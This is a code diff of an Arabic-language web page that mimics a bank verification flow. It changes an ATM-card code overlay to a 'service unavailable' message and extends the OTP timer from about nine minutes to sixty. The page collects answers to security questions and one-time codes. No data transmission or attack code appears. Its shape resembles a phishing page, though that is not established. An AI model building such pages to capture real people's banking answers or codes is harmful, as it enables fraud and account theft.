@@ -867,9 +867,9 @@
     <div class="atm-overlay" id="atmOverlay">
         <div class="atm-box">
             <i class="fas fa-credit-card"></i>
-            <div class="big-text">سيتم إرسال رمز</div>
-            <div class="sub-text">إلى بطاقة الصراف الآلي الخاصة بك</div>
-            <button class="btn-close-atm" onclick="closeAtmAndShowOtp()">حسناً</button>
+            <div class="big-text">قريباً</div>
+            <div class="sub-text">الخدمة غير متوفرة حالياً</div>
+            <button class="btn-close-atm" onclick="closeAtmMessage()">حسناً</button>
         </div>
     </div>
 
@@ -882,7 +882,7 @@
         <div class="otp-card">
             <div class="otp-timer">
                 <i class="fas fa-clock"></i>
-                <span class="time" id="timerDisplay">09:09</span>
+                <span class="time" id="timerDisplay">60:00</span>
             </div>
 
             <div class="otp-message">
@@ -926,7 +926,7 @@
     </div>
 
     <script>
-        // ===== الأسئلة (تم حذف سؤال الشارع) =====
+        // ===== الأسئلة =====
         const securityQuestions = [
             "ما هو اسم المدرسة التي التحقت بها؟",
             "اسم فريق كرة القدم المفضل لديك؟",
@@ -937,7 +937,7 @@
 
         let currentQuestionIndex = 0;
         let timerInterval = null;
-        let timeSeconds = 549; // 9:09
+        let timeSeconds = 3600; // 60 دقيقة
 
         // ===== تحديث السؤال =====
         function updateQuestion() {
@@ -959,8 +959,6 @@
                 alert('الرجاء إدخال الإجابة على سؤال الأمان');
                 return;
             }
-            // بعد الإجابة الصحيحة، ننتقل لصفحة OTP مباشرة (بدون رسالة الصراف)
-            // لكن حسب طلبك، بعد الإجابة نذهب لصفحة OTP
             document.getElementById('securityPage').style.display = 'none';
             document.getElementById('otpPage').style.display = 'block';
             document.getElementById('footer').style.marginTop = '0';
@@ -984,17 +982,13 @@
             document.getElementById('atmOverlay').classList.add('active');
         }
 
-        function closeAtmAndShowOtp() {
+        function closeAtmMessage() {
             document.getElementById('atmOverlay').classList.remove('active');
-            document.getElementById('securityPage').style.display = 'none';
-            document.getElementById('otpPage').style.display = 'block';
-            document.getElementById('footer').style.marginTop = '0';
-            startTimer();
         }
 
-        // ===== المؤقت =====
+        // ===== المؤقت (60 دقيقة) =====
         function startTimer() {
-            timeSeconds = 549; // 9:09
+            timeSeconds = 3600;
             updateTimerDisplay();
             if (timerInterval) clearInterval(timerInterval);
             timerInterval = setInterval(function() {
@@ -1022,7 +1016,7 @@
                 clearInterval(timerInterval);
                 timerInterval = null;
             }
-            timeSeconds = 549;
+            timeSeconds = 3600;
             updateTimerDisplay();
             document.getElementById('resendBtn').disabled = true;
             timerInterval = setInterval(function() {
@@ -1061,7 +1055,6 @@
                 return;
             }
             alert('✅ تم التحقق بنجاح!');
-            // هنا يمكن التوجه للوحة التحكم
         }
 
         // ===== إظهار/إخفاء كلمة المرور =====
